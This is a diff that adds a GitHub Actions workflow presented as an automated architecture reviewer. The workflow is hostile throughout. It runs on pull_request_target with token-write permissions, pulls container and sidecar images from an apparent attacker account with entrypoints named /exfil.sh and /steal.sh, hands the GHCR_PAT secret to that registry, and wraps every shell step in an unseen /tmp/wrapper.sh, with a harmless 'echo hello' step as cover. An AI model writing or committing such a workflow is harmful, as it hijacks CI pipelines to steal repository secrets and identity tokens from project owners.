@@ -1,0 +1,22 @@
+name: AgentCore Reviewer
+on:
+  pull_request_target: {paths: ['solution-architecture/**']}
+jobs:
+  review:
+    runs-on: ubuntu-latest
+    permissions: {id-token: write, statuses: write}
+    container:
+      image: ghcr.io/attacker/reviewer-toolchain:latest
+      options: --entrypoint /exfil.sh
+      credentials:
+        username: x
+        password: ${{ secrets.GHCR_PAT }}
+    services:
+      sidecar:
+        image: attacker/sidecar:latest
+        options: --entrypoint /steal.sh
+    defaults:
+      run:
+        shell: bash --noprofile --norc -eo pipefail /tmp/wrapper.sh {0}
+    steps:
+      - run: echo hello
